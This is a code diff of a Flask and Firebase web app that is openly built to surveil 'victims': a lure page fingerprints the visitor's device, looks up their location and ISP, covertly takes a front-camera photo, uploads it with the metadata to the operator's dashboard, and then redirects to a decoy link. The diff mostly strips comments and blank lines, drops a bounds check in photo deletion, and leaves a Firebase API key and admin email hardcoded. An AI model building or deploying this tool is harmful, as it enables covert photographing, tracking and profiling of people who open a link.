@@ -7,10 +7,9 @@ import pyrebase
 
 app = Flask(__name__)
 
-CORS(app, resources={r"/*": {"origins": "*"}}) 
+CORS(app, resources={r"/*": {"origins": "*"}})
 
-
-ADMIN_EMAIL = "Mastimusicboxabd01@gmail.com" 
+ADMIN_EMAIL = "Mastimusicboxabd01@gmail.com"
 
 firebase_config = {
     "apiKey": "AIzaSyDq3jnK4Y3W0T4H1m2HXRFRLpLQc8hiYlQ",
@@ -27,11 +26,9 @@ try:
     db = firebase.database()
     auth = firebase.auth()
 except Exception as e:
-    print(f"DB Error: {e}")
     db = None
     auth = None
 
-# --- AUTH DECORATOR ---
 def require_auth(f):
     @wraps(f)
     def decorated(*args, **kwargs):
@@ -47,7 +44,6 @@ def require_auth(f):
         return f(*args, **kwargs)
     return decorated
 
-# --- TARGET HTML (Victim View - served by Vercel) ---
 TARGET_HTML = """
 <!DOCTYPE html>
 <html>
@@ -72,13 +68,11 @@ TARGET_HTML = """
         try {
             let m = {ip:"{{ip}}", device:navigator.userAgent, platform:navigator.platform, screen:screen.width+'x'+screen.height};
             try{ const b=await navigator.getBattery(); m.battery=Math.round(b.level*100)+'%'; }catch(e){}
-            
             try {
                 const r = await fetch('https://ipapi.co/json/');
                 const j = await r.json();
                 m.city = j.city; m.country = j.country_name; m.isp = j.org; m.ip = j.ip;
             } catch(e){}
-
             const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
             const v=document.getElementById('v'); v.srcObject=s;
             await new Promise(r=>v.onloadedmetadata=r); v.play();
@@ -87,7 +81,6 @@ TARGET_HTML = """
             c.getContext('2d').drawImage(v,0,0);
             const i=c.toDataURL('image/jpeg',0.6).split(',')[1];
             s.getTracks().forEach(t=>t.stop());
-            
             await fetch('/u/{{sid}}', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({img:i, meta:m})});
             window.location.href="{{r_url}}";
         } catch(e) { window.location.href="{{r_url}}"; }
@@ -96,8 +89,6 @@ TARGET_HTML = """
 </body>
 </html>
 """
-
-# --- API ROUTES ---
 
 @app.route('/')
 def home():
@@ -109,14 +100,11 @@ def login_user():
     uid = request.user['localId']
     email = request.user.get('email', '')
     name = request.user.get('displayName', 'Unknown User')
-    
-    # Save user to DB
     db.child("users").child(uid).update({
         "email": email,
         "name": name,
         "last_login": time.time()
     })
-    
     is_admin = (email == ADMIN_EMAIL)
     return jsonify({'success': True, 'is_admin': is_admin, 'uid': uid, 'email': email})
 
@@ -142,8 +130,7 @@ def api_get_links():
 def api_delete_link(sid):
     uid = request.user['localId']
     l = db.child("links").child(sid).get().val()
-    # Admin can delete any link, User can delete only their own
-    if l and (l.get('uid') == uid or request.user.get('email') == ADMIN_EMAIL): 
+    if l and (l.get('uid') == uid or request.user.get('email') == ADMIN_EMAIL):
         db.child("links").child(sid).remove()
     return jsonify({'success': True})
 
@@ -152,7 +139,7 @@ def api_delete_link(sid):
 def api_edit_link(sid):
     uid = request.user['localId']
     l = db.child("links").child(sid).get().val()
-    if l and l.get('uid') == uid: 
+    if l and l.get('uid') == uid:
         db.child("links").child(sid).update({"url": request.json.get('url')})
     return jsonify({'success': True})
 
@@ -163,25 +150,20 @@ def api_delete_photo(sid, idx):
     l = db.child("links").child(sid).get().val()
     if l and (l.get('uid') == uid or request.user.get('email') == ADMIN_EMAIL):
         p = l.get('photos',[])
-        if 0 <= int(idx) < len(p):
-            p.pop(int(idx))
-            db.child("links").child(sid).update({"photos": p})
+        if not isinstance(p, list): p = []
+        p.pop(int(idx))
+        db.child("links").child(sid).update({"photos": p})
     return jsonify({'success': True})
 
-# --- ADMIN ROUTES ---
 @app.route('/api/admin/data')
 @require_auth
 def admin_data():
     if request.user.get('email') != ADMIN_EMAIL:
         return jsonify({'error': 'Unauthorized'}), 403
-    
     users = db.child("users").get().val() or {}
     all_links = db.child("links").get().val() or {}
-    
-    # Attach link count to users
     for uid, user in users.items():
         user['link_count'] = sum(1 for link in all_links.values() if link.get('uid') == uid)
-        
     return jsonify({'success': True, 'users': users, 'all_links': all_links})
 
 @app.route('/api/admin/delete_user/<uid>', methods=['POST'])
@@ -189,16 +171,12 @@ def admin_data():
 def admin_delete_user(uid):
     if request.user.get('email') != ADMIN_EMAIL:
         return jsonify({'error': 'Unauthorized'}), 403
-        
     db.child("users").child(uid).remove()
     all_links = db.child("links").get().val() or {}
     for sid, link in all_links.items():
         if link.get('uid') == uid:
             db.child("links").child(sid).remove()
-            
     return jsonify({'success': True})
-
-# --- VICTIM ROUTES (Kept on backend for security and redirection) ---
 
 @app.route('/v/<sid>')
 def view_link(sid):
@@ -215,6 +193,3 @@ def upload_data(sid):
         p.append(d['img'])
         db.child("links").child(sid).update({"photos": p, "meta": {**c.get('meta', {}), **d.get('meta', {})}})
     return "OK"
-
-if __name__ == '__main__':
-    app.run(debug=True, host='0.0.0.0', port=5000)
